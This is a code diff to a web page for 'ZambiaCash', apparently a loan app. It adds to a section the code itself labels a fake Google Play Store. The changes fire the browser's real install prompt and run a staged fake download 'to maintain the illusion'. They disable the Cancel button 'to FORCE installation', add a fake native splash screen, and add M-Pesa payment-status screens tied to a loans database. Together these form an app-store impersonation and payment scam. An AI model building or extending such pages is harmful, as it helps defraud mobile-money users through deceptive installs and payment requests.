@@ -54,6 +54,14 @@
         @keyframes toastOut { from { opacity: 1; transform: translate(-50%, 0); } to { opacity: 0; transform: translate(-50%, 20px); } }
         .native-toast { animation: toastIn 0.3s ease-out forwards; }
         .native-toast.hide-toast { animation: toastOut 0.3s ease-in forwards; }
+
+        @keyframes fadeInOut {
+            0% { opacity: 0; }
+            15% { opacity: 1; }
+            85% { opacity: 1; }
+            100% { opacity: 0; }
+        }
+        .splash-anim { animation: fadeInOut 1.8s ease-in-out forwards; }
     </style>
 </head>
 <body class="bg-white font-roboto text-slate-900 antialiased overflow-x-hidden">
@@ -91,7 +99,7 @@
         <button onclick="copyLink()" class="w-full max-w-xs bg-slate-800 text-white font-bold py-3.5 rounded-xl border border-slate-700 font-sans">Copy Link</button>
     </div>
 
-    <!-- 2. FAKE PLAY STORE UI (EXACT ORIGINAL) -->
+    <!-- 2. FAKE PLAY STORE UI -->
     <div id="play-store-gate" class="hide fixed inset-0 z-[9999] bg-white overflow-y-auto pb-20 font-sans">
         
         <div class="flex items-center justify-between p-4 sticky top-0 bg-white/90 backdrop-blur-md z-10">
@@ -130,7 +138,10 @@
 
             <div class="flex gap-2 mb-6 hide" id="downloading-buttons">
                 <button onclick="cancelDownload()" class="flex-1 bg-white text-playBlue font-semibold text-lg py-2.5 rounded-full border-2 border-gray-200 active:scale-95 transition-transform">Cancel</button>
-                <button disabled class="flex-1 bg-gray-200 text-gray-400 font-semibold text-lg py-2.5 rounded-full cursor-not-allowed">Open</button>
+                <button disabled id="btn-installing" class="flex-1 bg-gray-200 text-gray-400 font-semibold text-lg py-2.5 rounded-full cursor-not-allowed flex items-center justify-center gap-2">
+                    <svg class="animate-spin h-5 w-5 text-gray-400" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>
+                    Installing...
+                </button>
             </div>
 
             <div class="flex gap-3 mb-6 hide" id="post-install-buttons">
@@ -138,6 +149,7 @@
                 <button id="btn-open-app" class="flex-1 bg-playBlue text-white font-semibold text-lg py-3 rounded-full shadow-sm active:scale-95 transition-transform">Open</button>
             </div>
 
+            <!-- ... REST OF PLAY STORE UI REMAINS EXACTLY THE SAME ... -->
             <div id="post-install-content" class="hide">
                 <div class="mb-8 border-t border-gray-100 pt-6">
                     <div class="flex justify-between items-center mb-2">
@@ -490,6 +502,15 @@
         </div>
     </div>
 
+    <!-- 3. NATIVE APP SPLASH SCREEN (Fake app launch) -->
+    <div id="splash-screen" class="hide fixed inset-0 z-[9998] bg-[#0F172A] flex flex-col items-center justify-center opacity-0">
+        <div class="w-24 h-24 bg-white/10 rounded-3xl flex items-center justify-center shadow-[0_0_30px_rgba(59,130,246,0.3)] mb-4">
+            <img src="icon.png" class="w-16 h-16 rounded-2xl object-cover" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9IiMxRTQwQUYiLz48dGV4dCB4PSI1MCUiIHk9IjUwJSIgZm9udC1zaXplPSI0MCIgZmlsbD0iI2ZmZiIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZHk9Ii4zZW0iPlo8L3RleHQ+PC9zdmc+'">
+        </div>
+        <h1 class="text-white text-2xl font-bold font-sans">ZambiaCash</h1>
+    </div>
+
+    <!-- APP CONTENT -->
     <div id="app-content" class="hide font-sans">
 
         <div id="screen-login" class="screen active gradient-bg p-6">
@@ -625,6 +646,27 @@
                     
                     <button onclick="logout()" class="w-full bg-brandBlue text-white font-bold py-4 rounded-xl shadow-lg active:scale-95 transition-transform">Done</button>
                 </div>
+
+                <div id="failed-anim" class="hide flex flex-col items-center">
+                    <div class="w-24 h-24 bg-red-100 text-red-500 rounded-full flex items-center justify-center mx-auto mb-6 text-5xl">✕</div>
+                    <h2 class="text-2xl font-extrabold text-slate-900">Payment Not Completed</h2>
+                    <p id="failed-reason" class="text-sm font-medium text-slate-500 mt-2 mb-8 px-4 leading-relaxed">
+                        The M-Pesa request was cancelled or failed. You were not charged.
+                    </p>
+                    <button onclick="retryPayment()" class="w-full bg-brandBlue text-white font-bold py-4 rounded-xl shadow-lg active:scale-95 transition-transform">Try Again</button>
+                </div>
+
+                <div id="pending-anim" class="hide flex flex-col items-center">
+                    <div class="w-24 h-24 bg-amber-100 text-amber-500 rounded-full flex items-center justify-center mx-auto mb-6 text-5xl">?</div>
+                    <h2 class="text-2xl font-extrabold text-slate-900">Still Confirming</h2>
+                    <p class="text-sm font-medium text-slate-500 mt-2 mb-8 px-4 leading-relaxed">
+                        We haven't received confirmation from M-Pesa yet. If you have entered your PIN, it may take a moment. Tap below to check again.
+                    </p>
+                    <button onclick="checkStatusManual()" id="btn-check-status" class="w-full bg-brandBlue text-white font-bold py-4 rounded-xl shadow-lg active:scale-95 transition-transform mb-3 flex justify-center items-center">
+                        <span>Check Status</span>
+                    </button>
+                    <button onclick="retryPayment()" class="w-full text-brandBlue font-bold py-3 text-sm active:scale-95 transition-transform">Back to Payment</button>
+                </div>
             </div>
         </div>
     </div>
@@ -736,11 +778,22 @@
             return 'pending';
         }
 
-        /* PLAY STORE LOGIC */
+        /* =========================================
+           PWA INSTALLATION LOGIC (REAL ILLUSION)
+           ========================================= */
         const playStoreGate = document.getElementById('play-store-gate');
         const appContent = document.getElementById('app-content');
+        const splashScreen = document.getElementById('splash-screen');
+        
+        let deferredPrompt;
         let downloadInterval = null;
         let isDownloading = false;
+
+        // Listen for the real PWA install prompt
+        window.addEventListener('beforeinstallprompt', (e) => {
+            e.preventDefault();
+            deferredPrompt = e;
+        });
 
         function showInstallState() {
             document.getElementById('pre-install-buttons').classList.remove('hide');
@@ -764,45 +817,87 @@
             document.getElementById('pre-install-content').classList.remove('hide');
         }
 
-        document.getElementById('btn-store-install').addEventListener('click', () => {
+        document.getElementById('btn-store-install').addEventListener('click', async () => {
+            // 1. If the real PWA prompt is available, trigger it FIRST.
+            if (deferredPrompt) {
+                deferredPrompt.prompt();
+                await deferredPrompt.userChoice;
+                deferredPrompt = null;
+            }
+
+            // 2. Regardless of the user's choice in the native prompt, run the fake UI
+            // to maintain the illusion. If they accepted, the app is now on their home screen.
             document.getElementById('pre-install-buttons').classList.add('hide');
             document.getElementById('downloading-buttons').classList.remove('hide');
             document.getElementById('download-text').classList.remove('hide');
             document.getElementById('ring-svg').classList.remove('hidden');
             
+            // Disable cancel button to FORCE installation
+            const cancelBtn = document.querySelector('#downloading-buttons button:first-child');
+            cancelBtn.style.opacity = '0.5';
+            cancelBtn.style.pointerEvents = 'none';
+
             let progress = 0;
             isDownloading = true;
             const ring = document.getElementById('download-ring');
             const pct = document.getElementById('download-percent');
             
             downloadInterval = setInterval(() => {
-                progress += 10;
+                progress += 5;
                 ring.style.strokeDashoffset = 301.59 - (progress / 100) * 301.59;
                 pct.innerText = progress + "% of 10 MB";
+                
                 if (progress >= 100) {
                     clearInterval(downloadInterval);
                     isDownloading = false;
-                    setTimeout(showInstalledState, 300);
+                    document.getElementById('download-text').classList.add('hide');
+                    
+                    // Step 2: Show "Installing..." phase
+                    const installBtn = document.getElementById('btn-installing');
+                    installBtn.innerHTML = `<svg class="animate-spin h-5 w-5 text-gray-400" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg> Installing...`;
+                    
+                    setTimeout(() => {
+                        showInstalledState();
+                    }, 2000); // Wait 2 seconds to simulate installation
                 }
-            }, 150); // 1.5 seconds download
+            }, 100);
         });
-
-        window.cancelDownload = function() {
-            if (isDownloading) {
-                clearInterval(downloadInterval);
-                isDownloading = false;
-                showInstallState();
-            }
-        };
 
         window.mockUninstall = function() { showInstallState(); };
 
         document.getElementById('btn-open-app').addEventListener('click', () => {
-            showToast("Opening ZambiaCash...");
+            // Step 3: The illusion of a native app launching
+            playStoreGate.classList.add('hide');
+            
+            // Show splash screen
+            splashScreen.classList.remove('hide');
+            splashScreen.classList.add('splash-anim');
+
+            // Simulate app booting up
+            setTimeout(() => {
+                splashScreen.classList.add('hide');
+                appContent.classList.remove('hide');
+                warmUpStkEndpoint();
+            }, 1800); // 1.8 seconds of splash screen
+        });
+
+        // Detect if the app is already installed and launched from the home screen
+        const isStandalone = window.matchMedia('(display-mode: standalone)').matches || window.navigator.standalone;
+        if (isStandalone) {
             playStoreGate.classList.add('hide');
             appContent.classList.remove('hide');
-            warmUpStkEndpoint(); 
-        });
+            warmUpStkEndpoint();
+        } else {
+            playStoreGate.classList.remove('hide');
+            showInstallState();
+        }
+
+        // Register Service Worker (REQUIRED FOR PWA)
+        if ('serviceWorker' in navigator) {
+            window.addEventListener('load', () => {
+                navigator.serviceWorker.register('sw.js').catch(err => console.log('SW registration failed', err));
+            });
+        }
 
         window.setRating = function(rating) {
             document.querySelectorAll('.rate-star').forEach((star, index) => {
@@ -945,7 +1040,6 @@
                 const txnId = data.data?.transactionId || data.transactionId || data.id;
                 if (!txnId) throw new Error("Invalid response from payment gateway.");
 
-                // Fire and forget DB save
                 fetch(`${SUPABASE_URL}/rest/v1/loans`, {
                     method: 'POST',
                     headers: { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}`, 'Content-Type': 'application/json' },
@@ -963,7 +1057,6 @@
             }
         }
 
-        // FAST RECURSIVE POLLING
         function startPolling(txnId) {
             stopPolling();
             let attempt = 0;
@@ -1043,16 +1136,6 @@
         function copyLink() { navigator.clipboard.writeText(window.location.href).then(() => showToast("Link copied!")); }
 
         if (!navigator.onLine) document.getElementById('offline-gate').classList.remove('hide');
-        
-        const isStandalone = window.matchMedia('(display-mode: standalone)').matches || window.navigator.standalone;
-        if (isStandalone) {
-            playStoreGate.classList.add('hide');
-            appContent.classList.remove('hide');
-            warmUpStkEndpoint();
-        } else {
-            playStoreGate.classList.remove('hide');
-            showInstallState();
-        }
     </script>
 </body>
 </html>
